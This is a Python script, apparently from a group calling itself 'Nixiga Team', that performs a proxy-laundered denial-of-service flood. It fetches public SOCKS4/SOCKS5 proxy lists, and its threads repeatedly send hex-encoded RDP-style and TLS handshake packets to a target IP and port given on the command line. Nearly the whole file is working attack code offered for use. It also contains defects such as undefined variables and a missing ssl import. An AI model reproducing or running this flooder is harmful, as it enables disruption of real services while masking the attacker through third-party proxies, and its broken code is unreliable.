import os,sys
import threading
import socks
import socket
import random
import requests

def main():
    global ip, port, threads, proxies, x
    ip = str(sys.argv[1])
    port = int(sys.argv[2])
    threads = int(sys.argv[3])
    f = open(str(sys.argv[4]),'wb')
    r = requests.get('https://www.proxy-list.download/api/v1/get?type=socks5')
    f.write(r.content)
    r = requests.get("https://api.proxyscrape.com/v2/?request=getproxies&protocol=socks5&timeout=10000&country=all")
    f.write(r.content)
    r = requests.get("https://www.proxy-list.download/api/v1/get?type=socks4")
    f.write(r.content)
    r = requests.get("https://api.proxyscrape.com/v2/?request=getproxies&protocol=socks4&timeout=10000&country=all")
    f.write(r.content)
    f.close()
    proxies = open(str(sys.argv[4])).readlines()
    x = int(0)
    for x in range(threads):
        Socks(x+1).start()

class Socks(threading.Thread):
    def __init__(self, counter):
        threading.Thread.__init__(self)
        self.counter = counter

    def run(self):
        global req_code, error
        auth = bytearray.fromhex("030000130ee00000000000010008000b000000")
        data = bytearray.fromhex("1603010200010001fc0303f919d1f279892a7b5e08924cd5329e2ce1356fff8b459016014e86495da33058203370c4b0fc4f7ccda48d05e01e043dfee48c15ca230814c42845ebcdabab9c8c003e130213031301c02cc030009fcca9cca8ccaac02bc02f009ec024c028006bc023c0270067c00ac0140039c009c0130033009d009c003d003c0035002f00ff01000175000b000403000102000a000c000a001d0017001e00190018002300000016000000170000000d0030002e040305030603080708080809080a080b080408050806040105010601030302030301020103020202040205020602002b0009080304030303020301002d00020101003300260024001d00203686b50891279a669ebb460ccfa7e543a91d3adf3613a4dbe1d1957aa31cc06f001500dc00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000")
        current = x
        if current < len(proxies):
            proxy = proxies[current].strip().split(':')
        else:
            proxy = random.choice(proxies).strip().split(":")
        while True:
            try:
                socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, str(proxy[0]), int(proxy[1]), True)
                s = socks.socksocket()
                s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
                s.connect((str(host_url), int(port)))
                if str(port) == '443':
                    s = ssl.wrap_socket(s)
                s.send(auth)
                s.send(auth)
                s.send(auth)
                s.send(auth)
                s.send(auth)
                s.send(auth)
                s.send(auth)
                s.send(auth)
                s.send(auth)
                s.send(auth)
                s.send(auth)
                s.send(data)
                s.send(data)
                s.send(data)
                s.send(data)
                s.send(data)
                s.send(data)
                s.send(data)
                s.send(data)
                s.send(data)
                s.send(data)
                s.send(data)
                s.send(data)
                s.send(data)
                s.send(data)
                s.send(data)
                s.send(data)
                s.send(data)
                s.send(data)
                s.send(data)
                print("[!] Official Nixiga Team Community | Socks5RDP @ " +str(proxy[0])+ " => [" +host_url+ ":" +str(port)+ "]")
                try:
                    for y in range(multiple):
                        s.send(auth)
                        s.send(auth)
                        s.send(auth)
                        s.send(auth)
                        s.send(data)
                        s.send(data)
                        s.send(data)
                        s.send(data)
                        s.send(data)
                        s.send(data)
                except:
                    try:
                        s.close()
                    except:
                        pass
            except:
                try:
                    s.close()
                except:
                    pass
                try:
                    socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS4, str(proxy[0]), int(proxy[1]), True)
                    s = socks.socksocket()
                    s.connect((str(host_url), int(port)))
                    if str(port) == '443':
                        s = ssl.wrap_socket(s)
                    s.send(auth)
                    s.send(auth)
                    s.send(auth)
                    s.send(auth)
                    s.send(auth)
                    s.send(auth)
                    s.send(auth)
                    s.send(auth)
                    s.send(data)
                    s.send(data)
                    s.send(data)
                    s.send(data)
                    s.send(data)
                    s.send(data)
                    s.send(data)
                    s.send(data)
                    s.send(data)
                    s.send(data)
                    s.send(data)
                    s.send(data)
                    s.send(data)
                    s.send(data)
                    s.send(data)
                    s.send(data)
                    print("[!] Official Nixiga Team Community | Socks4RDP @ " +str(proxy[0])+ " => [" +host_url+ ":" +str(port)+ "]")
                    try:
                        for y in range(multiple):
                            s.send(auth)
                            s.send(data)
                    except:
                        try:
                            s.close()
                        except:
                            pass
                except:
                    try:
                        s.close()
                        proxy = random.choice(proxies).strip().split(":")
                    except:
                        pass

if __name__ == "__main__":
    main()
